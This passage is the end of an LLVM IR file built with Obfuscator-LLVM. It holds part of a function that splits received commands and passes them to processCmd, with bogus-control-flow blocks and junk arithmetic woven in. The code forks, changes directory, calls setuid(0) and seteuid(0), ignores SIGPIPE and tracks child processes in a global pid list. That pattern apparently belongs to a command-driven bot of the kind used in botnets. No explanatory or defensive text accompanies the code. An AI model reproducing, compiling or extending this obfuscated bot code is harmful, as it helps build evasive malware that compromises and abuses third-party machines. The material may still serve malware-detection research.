; <label>:556:                                    ; preds = %560, %551
  %557 = load i8*, i8** %18, align 8
  %558 = load i8, i8* %557, align 1
  %559 = icmp ne i8 %558, 0
  br i1 %559, label %560, label %569

; <label>:560:                                    ; preds = %556
  %561 = load i8*, i8** %18, align 8
  %562 = load i8, i8* %561, align 1
  %563 = zext i8 %562 to i32
  %564 = call i32 @toupper(i32 %563) #9
  %565 = trunc i32 %564 to i8
  %566 = load i8*, i8** %18, align 8
  store i8 %565, i8* %566, align 1
  %567 = load i8*, i8** %18, align 8
  %568 = getelementptr inbounds i8, i8* %567, i32 1
  store i8* %568, i8** %18, align 8
  br label %556

; <label>:569:                                    ; preds = %556
  store i32 1, i32* %20, align 4
  %570 = load i8*, i8** %15, align 8
  %571 = call i8* @strtok(i8* %570, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.574, i32 0, i32 0)) #5
  store i8* %571, i8** %21, align 8
  %572 = load i8*, i8** %17, align 8
  %573 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %572, i8** %573, align 16
  br label %574

; <label>:574:                                    ; preds = %605, %569
  %575 = load i8*, i8** %21, align 8
  %576 = icmp ne i8* %575, null
  br i1 %576, label %577, label %607

; <label>:577:                                    ; preds = %574
  %578 = load i8*, i8** %21, align 8
  %579 = load i8, i8* %578, align 1
  %580 = zext i8 %579 to i32
  %581 = icmp ne i32 %580, 10
  br i1 %581, label %582, label %605

; <label>:582:                                    ; preds = %577
  %583 = load i8*, i8** %21, align 8
  %584 = call i64 @strlen(i8* %583) #9
  %585 = add i64 %584, 1
  %586 = call noalias i8* @malloc(i64 %585) #5
  %587 = load i32, i32* %20, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %588
  store i8* %586, i8** %589, align 8
  %590 = load i32, i32* %20, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %591
  %593 = load i8*, i8** %592, align 8
  %594 = load i8*, i8** %21, align 8
  %595 = call i64 @strlen(i8* %594) #9
  %596 = add i64 %595, 1
  call void @llvm.memset.p0i8.i64(i8* %593, i8 0, i64 %596, i32 1, i1 false)
  %597 = load i32, i32* %20, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %598
  %600 = load i8*, i8** %599, align 8
  %601 = load i8*, i8** %21, align 8
  %602 = call i8* @strcpy(i8* %600, i8* %601) #5
  %603 = load i32, i32* %20, align 4
  %604 = add nsw i32 %603, 1
  store i32 %604, i32* %20, align 4
  br label %605

; <label>:605:                                    ; preds = %582, %577
  %606 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.574, i32 0, i32 0)) #5
  store i8* %606, i8** %21, align 8
  br label %574

; <label>:607:                                    ; preds = %574
  %608 = load i32, i32* %20, align 4
  %609 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %608, i8** %609)
  %610 = load i32, i32* %20, align 4
  %611 = icmp sgt i32 %610, 1
  br i1 %611, label %612, label %642

; <label>:612:                                    ; preds = %607
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %613

; <label>:613:                                    ; preds = %622, %612
  %614 = load i32, i32* %22, align 4
  %615 = load i32, i32* %20, align 4
  %616 = icmp slt i32 %614, %615
  br i1 %616, label %617, label %625

; <label>:617:                                    ; preds = %613
  %618 = load i32, i32* %22, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %619
  %621 = load i8*, i8** %620, align 8
  call void @free(i8* %621) #5
  br label %622

; <label>:622:                                    ; preds = %617
  %623 = load i32, i32* %22, align 4
  %624 = add nsw i32 %623, 1
  store i32 %624, i32* %22, align 4
  br label %613

; <label>:625:                                    ; preds = %613
  %626 = load i32, i32* @x.93
  %627 = load i32, i32* @y.94
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %625
  %634 = load i32, i32* @x.93
  %635 = load i32, i32* @y.94
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br label %642

; <label>:642:                                    ; preds = %originalBBpart2122, %607
  br label %643

; <label>:643:                                    ; preds = %642, %341
  br label %149

; <label>:644:                                    ; preds = %149
  br label %645

; <label>:645:                                    ; preds = %644, %120
  ret i32 0

originalBBalteredBB:                              ; preds = %originalBB, %54
  %646 = call i32 @fork() #5
  store i32 %646, i32* %8, align 4
  %647 = icmp ne i32 %646, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  call void @exit(i32 0) #12
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %99
  %648 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.571, i32 0, i32 0)) #5
  %649 = call i32 @setuid(i32 0) #5
  %650 = call i32 @seteuid(i32 0) #5
  %651 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %126
  %652 = call i32 @sleep(i32 5)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %168
  %653 = load i32, i32* %12, align 4
  %654 = add nsw i32 %653, 1
  store i32 %654, i32* %14, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %203
  %655 = load i32, i32* %14, align 4
  %_ = shl i32 %655, 1
  %_19 = sub i32 %655, 1
  %gen = mul i32 %_19, 1
  %_20 = sub i32 0, %655
  %gen21 = add i32 %_20, 1
  %_22 = sub i32 %655, 1
  %gen23 = mul i32 %_22, 1
  %_24 = sub i32 0, %655
  %gen25 = add i32 %_24, 1
  %_26 = shl i32 %655, 1
  %_27 = sub i32 0, %655
  %gen28 = add i32 %_27, 1
  %_29 = shl i32 %655, 1
  %656 = add i32 %655, 1
  store i32 %656, i32* %14, align 4
  br label %originalBB18

originalBB33alteredBB:                            ; preds = %originalBB33, %222
  %657 = load i32*, i32** @pids, align 8
  %658 = load i32, i32* %14, align 4
  %_34 = sub i32 0, %658
  %gen35 = add i32 %_34, 1
  %_36 = shl i32 %658, 1
  %659 = sub i32 %658, 1
  %660 = zext i32 %659 to i64
  %661 = getelementptr inbounds i32, i32* %657, i64 %660
  store i32 0, i32* %661, align 4
  %662 = load i64, i64* @numpids, align 8
  %_37 = sub i64 0, %662
  %gen38 = add i64 %_37, -1
  %_39 = sub i64 0, %662
  %gen40 = add i64 %_39, -1
  %_41 = sub i64 %662, -1
  %gen42 = mul i64 %_41, -1
  %_43 = sub i64 %662, -1
  %gen44 = mul i64 %_43, -1
  %663 = add i64 %662, -1
  store i64 %663, i64* @numpids, align 8
  %664 = load i64, i64* @numpids, align 8
  %_45 = sub i64 %664, 1
  %gen46 = mul i64 %_45, 1
  %_47 = sub i64 0, %664
  %gen48 = add i64 %_47, 1
  %_49 = sub i64 0, %664
  %gen50 = add i64 %_49, 1
  %_51 = sub i64 %664, 1
  %gen52 = mul i64 %_51, 1
  %665 = add i64 %664, 1
  %_53 = sub i64 %665, 4
  %gen54 = mul i64 %_53, 4
  %_55 = sub i64 0, %665
  %gen56 = add i64 %_55, 4
  %_57 = shl i64 %665, 4
  %_58 = shl i64 %665, 4
  %_59 = shl i64 %665, 4
  %_60 = shl i64 %665, 4
  %_61 = shl i64 %665, 4
  %666 = mul i64 %665, 4
  %667 = call noalias i8* @malloc(i64 %666) #5
  %668 = bitcast i8* %667 to i32*
  store i32* %668, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %originalBB33

originalBB65alteredBB:                            ; preds = %originalBB65, %266
  %669 = load i32, i32* %14, align 4
  %_66 = sub i32 0, %669
  %gen67 = add i32 %_66, 1
  %670 = add i32 %669, 1
  store i32 %670, i32* %14, align 4
  br label %originalBB65

originalBB71alteredBB:                            ; preds = %originalBB71, %293
  %671 = load i32, i32* %11, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %672
  store i8 0, i8* %673, align 1
  %674 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %674)
  %675 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %676 = call i8* @strstr(i8* %675, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.547, i32 0, i32 0)) #9
  %677 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %678 = icmp eq i8* %676, %677
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %324
  call void @exit(i32 0) #12
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %347
  %679 = load i8*, i8** %15, align 8
  %680 = getelementptr inbounds i8, i8* %679, i64 1
  store i8* %680, i8** %16, align 8
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %371
  %681 = load i8*, i8** %16, align 8
  %682 = load i8, i8* %681, align 1
  %683 = zext i8 %682 to i32
  %684 = icmp ne i32 %683, 0
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %392
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %419
  %685 = load i8*, i8** %16, align 8
  store i8 0, i8* %685, align 1
  %686 = load i8*, i8** %15, align 8
  %687 = getelementptr inbounds i8, i8* %686, i64 1
  store i8* %687, i8** %16, align 8
  %688 = load i8*, i8** %15, align 8
  %689 = load i8*, i8** %16, align 8
  %690 = call i64 @strlen(i8* %689) #9
  %691 = getelementptr inbounds i8, i8* %688, i64 %690
  %692 = getelementptr inbounds i8, i8* %691, i64 2
  store i8* %692, i8** %15, align 8
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %444
  %693 = load i8*, i8** %15, align 8
  %694 = load i8*, i8** %15, align 8
  %695 = call i64 @strlen(i8* %694) #9
  %_96 = sub i64 0, %695
  %gen97 = add i64 %_96, 1
  %_98 = shl i64 %695, 1
  %_99 = sub i64 %695, 1
  %gen100 = mul i64 %_99, 1
  %_101 = sub i64 %695, 1
  %gen102 = mul i64 %_101, 1
  %_103 = sub i64 0, %695
  %gen104 = add i64 %_103, 1
  %696 = sub i64 %695, 1
  %697 = getelementptr inbounds i8, i8* %693, i64 %696
  %698 = load i8, i8* %697, align 1
  %699 = zext i8 %698 to i32
  %700 = icmp eq i32 %699, 10
  br label %originalBB95

originalBB108alteredBB:                           ; preds = %originalBB108, %480
  %701 = load i8*, i8** %15, align 8
  %702 = load i8*, i8** %15, align 8
  %703 = call i64 @strlen(i8* %702) #9
  %704 = sub i64 %703, 1
  %705 = getelementptr inbounds i8, i8* %701, i64 %704
  store i8 0, i8* %705, align 1
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %502
  %706 = load i8*, i8** %15, align 8
  store i8* %706, i8** %17, align 8
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %532
  %707 = load i8*, i8** %15, align 8
  %708 = getelementptr inbounds i8, i8* %707, i32 1
  store i8* %708, i8** %15, align 8
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %625
  br label %originalBB120
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146506763}
!2 = !{i32 -2146505635}
!3 = !{i32 -2146504944}
!4 = !{i32 -2146504195}
!5 = !{i32 -2146503256}
!6 = !{i32 -2146502167}
